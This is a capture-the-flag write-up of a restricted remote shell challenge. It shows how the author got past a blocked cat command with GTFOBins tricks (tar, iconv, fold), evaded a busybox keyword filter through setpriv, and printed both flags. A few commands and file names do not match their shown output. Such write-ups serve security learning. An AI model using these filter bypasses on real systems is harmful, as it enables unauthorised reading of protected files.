# Work Computer
For this task, we were given a adress and port to connect to.
```bash
nc readme.ctfcompetition.com 1337
```
After conecting, we get into this shell thats on the remote server.
## Tampering the shell
First thing I did was to run **ls** and **ls -al** this showed me that there are two files in this directory-README.flag and orme.flag.  
Then I tried every way of openin the files including **cat strings vin nano** but none of them worked. Then I **cd** into the root directory and ran **ls -al**
```bash
cd ..
ls -al
```
I saw the bin folder there for me and I wanted to check what commands we could run.
```bash
cd bin
```
```
arch
busybox
chgrp
chown
conspy
date
df
dmesg
dnsdomainname
dumpkmap
echo
false
fdflush
fsync
getopt
hostname
ionice
iostat
ipcalc
kill
login
ls
lzop
makemime
mkdir
mknod
mktemp
mount
mountpoint
mpstat
netstat
nice
pidof
ping
ping6
pipe_progress
printenv
ps
pwd
reformime
rm
rmdir
run-parts
setpriv
setserial
shell
sleep
stat
stty
sync
tar
true
umount
uname
usleep
watch
```
So these are the commands we could work with and we want to find the one that could spit out the content of the file.  
A great resource here is [GTFOBins](https://gtfobins.github.io)and if we select the file read section, we could see loads of commands that we could use to read a file.  
I compared the list to the one on CTFOBins and I saw that we could use the **tar** command to read files.  
## Read File Using **tar**
The syntax goes like this
```bash
LFILE=file_to_read
tar xf "$LFILE" -I '/bin/sh -c "cat 1>&2"'
```
This one doesn't work as it will still need **cat**. Another approach is just creating a tar which will give us a preview of the file.
So if we do that with our remote shell
```
tar c README.md
OUTPUT:
  README.flag0000400000247200024720000000003413665111625010421 0ustar  13381338CTF{4ll_D474_5h4ll_B3_Fr33}
```
## Ultimate Method (Bonus Flag)
As you can see there is a binary installed called **busybox** which is a toolbox combines tiny versions of many common UNIX utilities into a single small executable. Ant from the **ls -al** we found that all the binary tools are symbolic linked to **/bin/busybox** which means that all the function we get are from the toolkit. From there we could almost execute any command we need.  
### busybox
There is also a twist here, if we run the busybox command, we see that it is filtered and we couldn't access it. This is probable due to a keyword filter on the user so our goal is to run it without typing it.  
When I was wondering about changing the name of the directory, I saw that we have a binary called setpriv which could run a program with different Linux privilege settings(non-exist user id).  

```bash
setpriv busybox cat README.flag
setpriv busybox chmod 777 ORME.flag
setpriv busybox  cat ORME
```
## Deep Dive
We know that we have other binaries stored in **/usr/bin** and we could see that we have some other great methods of cracking the files.
```
basename
beep
blkdiscard
c_rehash
cal
chvt
cksum
clear
cpio
crontab
cryptpw
dc
deallocvt
dirname
dos2unix
du
eject
env
expr
factor
fallocate
flock
fold
free
fuser
getconf
getent
groups
hostid
iconv
id
install
ipcrm
ipcs
killall
ldd
logger
lsof
lsusb
lzcat
lzma
lzopcat
md5sum
mesg
microcom
mkfifo
mkpasswd
nmeter
nohup
nproc
nsenter
nslookup
openvt
passwd
patch
pgrep
pkill
pmap
printf
pstree
pwdx
readlink
realpath
renice
reset
resize
scanelf
seq
setkeycodes
setsid
sha1sum
sha256sum
sha3sum
sha512sum
showkey
shred
shuf
smemcap
split
sum
test
time
timeout
top
truncate
tty
ttysize
udhcpc6
unix2dos
unlink
unlzma
unlzop
unshare
unxz
uptime
upx
vlock
volname
wc
which
whoami
yes
```
### iconv
This is used to convert file encoding.
```
iconv README.flag
```
### fold
This method is on GTFOBins and could be implemented like this
```
LFILE=file_to_read
fold -w1000 "$LFILE"
```
## flag
```
CTF{4ll_D474_5h4ll_B3_Fr33}

CTF{Th3r3_1s_4lw4y5_4N07h3r_W4y}
```
